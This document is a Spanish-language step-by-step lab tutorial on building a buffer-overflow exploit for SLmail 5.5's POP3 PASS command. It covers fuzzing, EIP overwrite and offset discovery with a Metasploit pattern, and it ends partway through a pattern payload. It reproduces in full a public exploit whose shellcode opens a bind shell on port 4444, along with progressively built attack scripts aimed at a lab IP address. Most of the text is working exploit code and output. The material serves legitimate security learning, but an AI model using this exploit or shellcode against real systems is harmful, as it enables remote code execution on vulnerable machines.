
---

Para crear un script operativo que aplique un buffer overflow, lo primero que podemos hacer es buscar con **searchsploit** posibles exploits.

Acción:

```bash
searchsploit slmail 5.5
```

Resultado:

```bash
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Seattle Lab Mail (SLmail) 5.5 - POP3 'PASS' Remote Buffer Overflow (1)                                                                               | windows/remote/638.py
Seattle Lab Mail (SLmail) 5.5 - POP3 'PASS' Remote Buffer Overflow (2)                                                                               | windows/remote/643.c
Seattle Lab Mail (SLmail) 5.5 - POP3 'PASS' Remote Buffer Overflow (3)                                                                               | windows/remote/646.c
Seattle Lab Mail (SLmail) 5.5 - POP3 'PASS' Remote Buffer Overflow (Metasploit)                                                                      | windows/remote/16399.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Acción:

```bash
searchsploit -x windows/remote/638.py
```

Analizamos el contenido del primero

```python

import struct
import socket

print "\n\n###############################################"
print "\nSLmail 5.5 POP3 PASS Buffer Overflow"
print "\nFound & coded by muts [at] offsec.com"
print "\nFor Educational Purposes Only!"
print "\n\n###############################################"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


sc = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
sc += "\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
sc += "\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
sc += "\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
sc += "\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
sc += "\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
sc += "\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
sc += "\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
sc += "\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
sc += "\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
sc += "\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
sc += "\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
sc += "\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
sc += "\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
sc += "\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
sc += "\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
sc += "\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
sc += "\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
sc += "\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
sc += "\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
sc += "\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
sc += "\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
sc += "\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
sc += "\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
sc += "\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"

#Tested on Win2k SP4 Unpatched
# Change ret address if needed
buffer = '\x41' * 4654 + struct.pack('<L', 0x783d6ddf) + '\x90'*32 + sc
try:
        print "\nSending evil buffer..."
        s.connect(('192.168.1.167',110))
        data = s.recv(1024)
        s.send('USER username' +'\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        data = s.recv(1024)
        s.close()
        print "\nDone! Try connecting to port 4444 on victim machine."
except:
        print "Could not connect to POP3!"

```

Con esta información podemos empezar a construir nuestro script. Uno que empiece con el [Fuzzing ENP](Fuzzing%20ENP.md)

```python
#!/usr/bin/env python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.65"
port = 110

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    print(banner)

if __name__ == '__main__':

    exploit()
```

Hacemos una prueba/traza mostrando el banner que veíamos al conectarnos por `telnet` (SLMail)

Resultado: python3 exploit.py

```bash
b'+OK POP3 server Hombasic-BOF ready <00001.1489031@Hombasic-BOF>\r\n'
```

Confirmado esto, podemos seguir introduciendo la data requerida, por partes:

```python
#!/usr/bin/env python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.65"
port = 110

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    
    s.send(b"USER Metahumo" + b'\r\n')
    response = s.recv(1024)
    print(response)

if __name__ == '__main__':

    exploit()
```

Resultado: vemos el banner, tras haber introducido a un usuario existente

```bash
b'+OK metahumo welcome here\r\n'
```

Ahora añadimos un condicional arriba del apartado de `# Variables globales` para indicar que el script se ejecutará pasándole un argumento, en concreto el de la longitud, para así poder controlar cuantos bytes/caracteres enviamos por cada solicitud. De este modo con [Immunity Debugger](Immunity%20Debugger.md) podemos ver el momento exacto en el que se corrompe el servicio para entender este proceso en el que se ejecuta un Buffer overflow ([BOF](BOF.md))

```python
if len(sys.argv) !=2:
    print("\n[!] Uso: exploit.py <lenght>")
    exit(1)
```

Como por **searchsploit** vimos que el campo vulnerable para un [BOF](BOF.md) era el del 'PASS' concluimos el script enviando para el campo 'PASS' una cadena de bytes que pasaremos su longitud como argumento del script. Para de este modo en paralelo con [Immunity Debugger](Immunity%20Debugger.md) ver el momento en el que interrumpimos el servicio. Ya que al enviar una cadena baja como sería `python3 exploit.py 50` el servicio que arrancamos por Immunity Debugger sigue en ejecución. Mientras que al enviar una cadena de '5000' el servicio se pausa y obtenemos el informe en la pestaña 'Registers (FPU)' de Immunity Debugger

```python
#!/usr/bin/env python3

import socket
import sys

if len(sys.argv) !=2:
    print("\n[!] Uso: exploit.py <lenght>")
    exit(1)

# Variables globales
ip_address = "192.168.1.65"
port = 110
total_lenght = int(sys.argv[1])

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    
    s.send(b"USER Metahumo" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + b"A"*total_lenght + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

![[ID_6.png]]

---
# Conclusión sobre la sobreescritura del registro EIP con `41414141`

El valor `41414141` en el registro **EIP** indica que el programa ha leído y ejecutado una dirección de memoria que nosotros hemos podido controlar. En este caso, se trata del carácter `'A'` repetido, cuyo valor en ASCII es `0x41`. Esto demuestra que:

- Hemos sobrescrito el registro EIP.
- Podemos controlar el flujo de ejecución del programa.

## ¿Qué implica esto?

EIP es el registro que la CPU utiliza para saber qué instrucción debe ejecutar a continuación. Si logramos sobrescribirlo con un valor que controlamos (como `41414141`), podemos redirigir la ejecución del programa hacia:

- Una shellcode que diseñemos previamente.
- Una instrucción `jmp esp`, si ya preparamos la pila con nuestro código.
- Cualquier dirección de memoria que contenga nuestro payload malicioso.

## En resumen

La aparición de `41414141` en EIP es una **prueba visual clave** de que nuestra cadena de bytes ha alcanzado y sobrescrito el flujo de control del programa.  
Este es precisamente el objetivo de un buffer overflow: **alcanzar el punto donde podemos tomar el control de la ejecución** para redirigirla hacia nuestro código malicioso.

---

Dado que ahora sabemos que con una longitud de 5000 caracteres, el servicio se detiene. Vamos a usar una utilidad de [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Herramientas/Metaesploit/Metasploit|Metasploit]] para generar un payload de 5000 caracteres, especialmente diseñado para indicarnos la cifra exacta de caracteres a introducir hasta que el servicio se detiene. Este punto exacto se conoce como **offset**

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

Resultado:

```bash
Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk
```

Este payload lo podemos integrar en nuestro script

```python
#!/usr/bin/env python3

import socket
import sys

# Variables globales
ip_address = "192.168.1.65"
port = 110

payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8E